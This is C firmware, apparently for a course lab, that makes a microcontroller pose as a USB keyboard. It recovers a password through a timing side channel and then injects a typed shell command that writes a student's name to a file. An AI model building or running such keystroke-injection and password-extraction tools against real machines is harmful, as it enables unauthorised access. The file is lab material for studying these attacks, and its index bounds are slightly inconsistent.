#include "KeyboardHID.h"
#include "german_keyboardCodes.h"
#include "handlers.h"
#include "report_utils.h"

#define LED1 P1_1
#define LED2 P1_0
#define TICKS_PER_SECOND 10000

volatile uint32_t system_ticks;
uint32_t characterResponseTimes[84];
char discoveredPasswordBuffer[20];

uint8_t nameCharPosition = 0;
uint8_t awaitingKeyRelease = 0;
uint8_t testingCharacterIndex = 0;
static uint8_t detectedCharacterIndex = 0;
uint8_t passwordOutputPosition = 0;
uint8_t extractedPasswordLength = 0;
bool nameKeyReleased = true;

bool capsLockPhaseFinished = false;
bool shouldSendEnterKey = false;
bool readyForNextCharacter = false;
static bool passwordExtractionComplete = false;

const char nameString[] = "echo \"mehmet arslan\" > $HOME/03811532";

XMC_SCU_CLOCK_CONFIG_t clock_config = 
{
	.syspll_config.p_div = 2,
	.syspll_config.n_div = 80,
	.syspll_config.k_div = 4,
	.syspll_config.mode = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp = true,
	.calibration_mode = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv = 1,
	.fcpu_clkdiv = 1,
	.fccu_clkdiv = 1,
	.fperipheral_clkdiv = 1
};

void SystemCoreClockSetup(void);

void SysTick_Handler(void)
{
	system_ticks++;
}

bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo, uint8_t *const ReportID, const uint8_t ReportType, void *ReportData, uint16_t *const ReportSize);
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo, const uint8_t ReportID, const uint8_t ReportType, const void *ReportData, const uint16_t ReportSize);
uint8_t GetCharCodeInGerman(char c, uint8_t *modifier);
char IndexToChar(uint8_t index);
uint8_t findTheChar();

int main(void)
{
	XMC_GPIO_SetMode(LED1, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();

	for (int i = 0; i < 800000; i++)
		;

	SysTick_Config(SystemCoreClock / TICKS_PER_SECOND);
	XMC_GPIO_SetOutputHigh(LED2);
	
	while (1)
	{
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

// Convert index (0-84) to character
char IndexToChar(uint8_t index)
{
	// 0-25: lowercase a-z
	if (index < 26)
	{
		return 'a' + index;
	}
	// 26-51: uppercase A-Z
	if (index < 52)
	{
		return 'A' + (index - 26);
	}
	// 52-61: digits 0-9
	if (index < 62)
	{
		return '0' + (index - 52);
	}
	// 62-84: special characters
	static const char specialChars[] = {
		'!',  // 62
		'(',  // 63
		')',  // 64
		'-',  // 65
		'_',  // 66
		'+',  // 67
		'=',  // 68
		'~',  // 69
		';',  // 70
		':',  // 71
		',',  // 72
		'.',  // 73
		'<',  // 74
		'>',  // 75
		'[',  // 76
		']',  // 77
		'{',  // 78
		'}',  // 79
		'/',  // 80
		'?',  // 81
		'&',  // 82
		'$',  // 83
		' ',  // 84
		'"'   // 85
	};

	if (index >= 62 && index <= 85)
	{
		return specialChars[index - 62];
	}
	return 0;
}

// Convert ASCII character to German keyboard scancode
uint8_t GetCharCodeInGerman(char c, uint8_t *modifier)
{
	*modifier = 0;

	// Lowercase letters (a-z) - handle y/z swap
	if (c >= 'a' && c <= 'z')
	{
		if (c == 'y') return GERMAN_KEYBOARD_SC_Y;
		if (c == 'z') return GERMAN_KEYBOARD_SC_Z;

		return GERMAN_KEYBOARD_SC_A + (c - 'a');
	}

	// Uppercase letters (A-Z) - handle y/z swap
	if (c >= 'A' && c <= 'Z')
	{
		*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
		if (c == 'Y') return GERMAN_KEYBOARD_SC_Y;
		if (c == 'Z') return GERMAN_KEYBOARD_SC_Z;

		return GERMAN_KEYBOARD_SC_A + (c - 'A');
	}

	// Numbers and special characters
	switch (c)
	{
		// Numbers (no modifier)
		case '0': return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
		case '1': return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
		case '2': return GERMAN_KEYBOARD_SC_2_AND_QUOTES;
		case '3': return GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH;
		case '4': return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
		case '5': return GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE;
		case '6': return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
		case '7': return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '8': return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case '9': return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;

		// Special characters with Shift
		case '!':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
		case '"':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_2_AND_QUOTES;
		case '$':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
		case '&':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
		case '/':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '(':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case ')':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
		case '=':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
		case '?':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH;
		case '*':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
		case '_':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
		case ';':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
		case ':':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
		case '>':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;

		// Special characters with Right Alt (AltGr)
		case '{':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '[':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case ']':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
		case '}':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
		case '~':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;

		// Other characters (no modifier)
		case '+': return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
		case '-': return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
		case ',': return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
		case '.': return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
		case ' ': return GERMAN_KEYBOARD_SC_SPACE;
		case '<': return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;
	}

	return 0;
}




bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo, uint8_t *const ReportID, const uint8_t ReportType, void *ReportData, uint16_t *const ReportSize)
{
	USB_KeyboardReport_Data_t *report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);

	static bool isReleased = true;
	static bool capsLockPressed = false;

	if (!passwordExtractionComplete)
	{
		HandlePasswordInput(report, &isReleased);
	}
	else if (!capsLockPhaseFinished)
	{
		HandleCapsLockToggle(report, &capsLockPressed);
	}
	else if (capsLockPhaseFinished)
	{
		HandleNameOutput(report);
	}

	return true;
}

uint8_t findTheChar()
{
	uint8_t longest_time_id = 0;
	uint32_t longest_time = 0;
	for (int i = 0; i < 84; i++)
	{
		if (longest_time < characterResponseTimes[i])
		{
			longest_time = characterResponseTimes[i];
			longest_time_id = i;
		}
	}
	return longest_time_id - 1;
}

void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo, const uint8_t ReportID, const uint8_t ReportType, const void *ReportData, const uint16_t ReportSize)
{
	uint8_t *report = (uint8_t *)ReportData;

	if (*report & HID_KEYBOARD_LED_NUMLOCK)
	{
		XMC_GPIO_SetOutputHigh(LED1);
		if (testingCharacterIndex == 84)
		{
			detectedCharacterIndex = findTheChar();
			discoveredPasswordBuffer[extractedPasswordLength++] = detectedCharacterIndex;
			testingCharacterIndex = 0;
		}
		readyForNextCharacter = true;
	}
	else
	{
		XMC_GPIO_SetOutputLow(LED1);
		readyForNextCharacter = false;
	}

	if (*report & HID_KEYBOARD_LED_CAPSLOCK)
	{
		XMC_GPIO_SetOutputHigh(LED2);
		passwordExtractionComplete = true;
	}
	else
	{
		XMC_GPIO_SetOutputLow(LED2);
	}
}

// This function is given by the instructor
void SystemCoreClockSetup(void)
{
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}